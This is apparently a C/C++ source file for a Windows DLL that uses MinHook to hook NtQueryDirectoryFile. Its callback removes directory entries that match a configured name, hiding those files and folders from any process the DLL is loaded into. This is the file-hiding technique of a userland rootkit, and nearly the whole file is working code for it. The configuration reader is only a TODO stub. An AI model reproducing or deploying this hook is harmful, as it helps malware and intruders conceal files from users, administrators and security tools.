#include "FileHider.h"
#include "stdafx.h"

typedef enum _FILE_INFORMATION_CLASS
{
	FileDirectoryInformation = 1,
	FileFullDirectoryInformation,
	FileIdFullDirectoryInformation,
	FileBothDirectoryInformation,
	FileIdBothDirectoryInformation,
	FileBasicInformation,
	FileStandardInformation,
	FileInternalInformation,
	FileEaInformation,
	FileAccessInformation,
	FileNameInformation,
	FileRenameInformation,
	FileLinkInformation,
	FileNamesInformation,
	FileDispositionInformation,
	FilePositionInformation,
	FileFullEaInformation,
	FileModeInformation,
	FileAlignmentInformation,
	FileAllInformation,
	FileAllocationInformation,
	FileEndOfFileInformation,
	FileAlternateNameInformation,
	FileStreamInformation,
	FilePipeInformation,
	FilePipeLocalInformation,
	FilePipeRemoteInformation,
	FileMailslotQueryInformation,
	FileMailslotSetInformation,
	FileCompressionInformation,
	FileObjectIdInformation,
	FileCompletionInformation,
	FileMoveClusterInformation,
	FileQuotaInformation,
	FileReparsePointInformation,
	FileNetworkOpenInformation,
	FileAttributeTagInformation,
	FileTrackingInformation,
	FileMaximumInformation
} FILE_INFORMATION_CLASS, *PFILE_INFORMATION_CLASS;


ULONG getDirEntryFileLength(PVOID FileInformationBuffer, FILE_INFORMATION_CLASS FileInfoClass)
{
	ULONG ulResult = 0;
	switch (FileInfoClass)
	{
	case FileDirectoryInformation:
		ulResult = (ULONG)((PFILE_DIRECTORY_INFORMATION)FileInformationBuffer)->FileNameLength;
		break;
	case FileFullDirectoryInformation:
		ulResult = (ULONG)((PFILE_FULL_DIR_INFORMATION)FileInformationBuffer)->FileNameLength;
		break;
	case FileIdFullDirectoryInformation:
		ulResult = (ULONG)((PFILE_ID_FULL_DIR_INFORMATION)FileInformationBuffer)->FileNameLength;
		break;
	case FileBothDirectoryInformation:
		ulResult = (ULONG)((PFILE_BOTH_DIR_INFORMATION)FileInformationBuffer)->FileNameLength;
		break;
	case FileIdBothDirectoryInformation:
		ulResult = (ULONG)((PFILE_ID_BOTH_DIR_INFORMATION)FileInformationBuffer)->FileNameLength;
		break;
	case FileNamesInformation:
		ulResult = (ULONG)((PFILE_NAMES_INFORMATION)FileInformationBuffer)->FileNameLength;
		break;
	}
	return ulResult;
}

void setDirEntryLenToNext(PVOID FileInformationBuffer, FILE_INFORMATION_CLASS FileInfoClass, DWORD value)
{
	switch (FileInfoClass)
	{
	case FileDirectoryInformation:
		((PFILE_DIRECTORY_INFORMATION)FileInformationBuffer)->NextEntryOffset = value;
		break;
	case FileFullDirectoryInformation:
		((PFILE_FULL_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset = value;
		break;
	case FileIdFullDirectoryInformation:
		((PFILE_ID_FULL_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset = value;
		break;
	case FileBothDirectoryInformation:
		((PFILE_BOTH_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset = value;
		break;
	case FileIdBothDirectoryInformation:
		((PFILE_ID_BOTH_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset = value;
		break;
	case FileNamesInformation:
		((PFILE_NAMES_INFORMATION)FileInformationBuffer)->NextEntryOffset = value;
		break;
	}
}

PVOID getDirEntryFileName(PVOID FileInformationBuffer, FILE_INFORMATION_CLASS FileInfoClass)
{
	PVOID pvResult = NULL;
	switch (FileInfoClass)
	{
	case FileDirectoryInformation:
		pvResult = (PVOID)&((PFILE_DIRECTORY_INFORMATION)FileInformationBuffer)->FileName[0];
		break;
	case FileFullDirectoryInformation:
		pvResult = (PVOID)&((PFILE_FULL_DIR_INFORMATION)FileInformationBuffer)->FileName[0];
		break;
	case FileIdFullDirectoryInformation:
		pvResult = (PVOID)&((PFILE_ID_FULL_DIR_INFORMATION)FileInformationBuffer)->FileName[0];
		break;
	case FileBothDirectoryInformation:
		pvResult = (PVOID)&((PFILE_BOTH_DIR_INFORMATION)FileInformationBuffer)->FileName[0];
		break;
	case FileIdBothDirectoryInformation:
		pvResult = (PVOID)&((PFILE_ID_BOTH_DIR_INFORMATION)FileInformationBuffer)->FileName[0];
		break;
	case FileNamesInformation:
		pvResult = (PVOID)&((PFILE_NAMES_INFORMATION)FileInformationBuffer)->FileName[0];
		break;
	}
	return pvResult;
}

DWORD getDirEntryLenToNext(PVOID FileInformationBuffer, FILE_INFORMATION_CLASS FileInfoClass)
{
	DWORD dwResult = 0;
	switch (FileInfoClass)
	{
	case FileDirectoryInformation:
		dwResult = ((PFILE_DIRECTORY_INFORMATION)FileInformationBuffer)->NextEntryOffset;
		break;
	case FileFullDirectoryInformation:
		dwResult = ((PFILE_FULL_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset;
		break;
	case FileIdFullDirectoryInformation:
		dwResult = ((PFILE_ID_FULL_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset;
		break;
	case FileBothDirectoryInformation:
		dwResult = ((PFILE_BOTH_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset;
		break;
	case FileIdBothDirectoryInformation:
		dwResult = ((PFILE_ID_BOTH_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset;
		break;
	case FileNamesInformation:
		dwResult = ((PFILE_NAMES_INFORMATION)FileInformationBuffer)->NextEntryOffset;
		break;
	}
	return dwResult;
}

BOOL config_CheckString(char * str, char *str2)
{
	if (StrStrIA(str, str2) != NULL)
		return TRUE;
	return FALSE;
}

char * readFilesFromConfiguration(char * configFileName)
{
	char * test1 = configFileName;
	return test1;
}

NTSTATUS WINAPI NtQueryDirectoryFileCallback(HANDLE hFile, HANDLE hEvent, PIO_APC_ROUTINE IoApcRoutine, PVOID IoApcContext,
	PIO_STATUS_BLOCK pIoStatusBlock, PVOID FileInformationBuffer, ULONG FileInformationBufferLength, FILE_INFORMATION_CLASS FileInfoClass,
	BOOLEAN bReturnOnlyOneEntry, PUNICODE_STRING PathMask, BOOLEAN bRestartQuery)
{

	NTSTATUS rc;
	char * configFileName = "configuration file name here!";
	//TODO: CHANGE FILE TO READ FROM CONFIGURATION
	char * ConfigHiddenFileDir = readFilesFromConfiguration(configFileName);//Name of the Folder to be Hide
	rc = Real_NtQueryDirectoryFile(hFile, hEvent, IoApcRoutine, IoApcContext, pIoStatusBlock,
		FileInformationBuffer, FileInformationBufferLength, FileInfoClass, bReturnOnlyOneEntry,
		PathMask, bRestartQuery);

	if (NT_SUCCESS(rc) && (FileInfoClass == FileDirectoryInformation || FileInfoClass == FileFullDirectoryInformation ||
		FileInfoClass == FileIdFullDirectoryInformation || FileInfoClass == FileBothDirectoryInformation ||
		FileInfoClass == FileIdBothDirectoryInformation || FileInfoClass == FileNamesInformation))
	{

		PVOID p = FileInformationBuffer;
		PVOID pLast = NULL;
		BOOL bLastOne, bFound;
		UNICODE_STRING usName;
		ANSI_STRING asName;

		if (bReturnOnlyOneEntry) // if only one entry returned we should give the next if it suppose to be hidden
		{
			usName.Buffer = (PWSTR)getDirEntryFileName(FileInformationBuffer, FileInfoClass);
			usName.Length = (USHORT)getDirEntryFileLength(FileInformationBuffer, FileInfoClass);
			RtlUnicodeStringToAnsiString(&asName, &usName, TRUE);
			bFound = config_CheckString(ConfigHiddenFileDir, asName.Buffer);
			RtlFreeAnsiString(&asName);

			if (bFound)
			{
				rc = Real_NtQueryDirectoryFile(hFile, hEvent, IoApcRoutine, IoApcContext, pIoStatusBlock,
					FileInformationBuffer, FileInformationBufferLength, FileInfoClass, bReturnOnlyOneEntry,
					PathMask, bRestartQuery);

				if (rc != STATUS_SUCCESS)
					return(rc);

				usName.Buffer = (PWSTR)getDirEntryFileName(FileInformationBuffer, FileInfoClass);
				usName.Length = (USHORT)getDirEntryFileLength(FileInformationBuffer, FileInfoClass);
				RtlUnicodeStringToAnsiString(&asName, &usName, TRUE);
				bFound = config_CheckString(ConfigHiddenFileDir, asName.Buffer);
				RtlFreeAnsiString(&asName);
			}
		}
		else // if full list hide the ones that should be hidden
		{
			do
			{
				bLastOne = !getDirEntryLenToNext(p, FileInfoClass);

				// compare directory-name 
				if (getDirEntryFileLength(p, FileInfoClass))
				{
					usName.Buffer = (PWSTR)getDirEntryFileName(p, FileInfoClass);
					usName.Length = (USHORT)getDirEntryFileLength(p, FileInfoClass);
					RtlUnicodeStringToAnsiString(&asName, &usName, TRUE);
					if (config_CheckString(ConfigHiddenFileDir, asName.Buffer))
					{
						RtlFreeAnsiString(&asName);
						if (bLastOne)
						{
							if (p == FileInformationBuffer) rc = 0x80000006;
							else setDirEntryLenToNext(pLast, FileInfoClass, 0);
							break;
						}
						else
						{
							int iPos = ((ULONG)p) - (ULONG)FileInformationBuffer;
							int iLeft = (DWORD)FileInformationBufferLength - iPos - getDirEntryLenToNext(p, FileInfoClass);
							RtlCopyMemory(p, (PVOID)((char*)p + getDirEntryLenToNext(p, FileInfoClass)), (DWORD)iLeft);
							continue;
						}
					}
					RtlFreeAnsiString(&asName);
				}

				pLast = p;
				p = ((char*)p + getDirEntryLenToNext(p, FileInfoClass));
			} while (!bLastOne);
		}
	}
	return rc;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:

		if (MH_Initialize() != MH_OK)
		{
			MessageBoxW(NULL, L"Failed Initialize", L"Info!", MB_ICONWARNING | MB_OK);
		}
		if (MH_CreateHook(&NtQueryDirectoryFile, &NtQueryDirectoryFileCallback, reinterpret_cast<void**>(&Real_NtQueryDirectoryFile)) != MH_OK)
		{
			MessageBoxW(NULL, L"connect Disabled by hooking", L"Info!", MB_ICONWARNING | MB_OK);
		}
		if (MH_EnableHook(&NtQueryDirectoryFile) != MH_OK)
		{
			MessageBoxW(NULL, L"Failed EnableHook connect", L"Info!", MB_ICONWARNING | MB_OK);
		}
		break;
	case DLL_PROCESS_DETACH:
		if (MH_DisableHook(&NtQueryDirectoryFile) != MH_OK) {}
		if (MH_Uninitialize() != MH_OK) {}
		break;
	}
	return TRUE;
}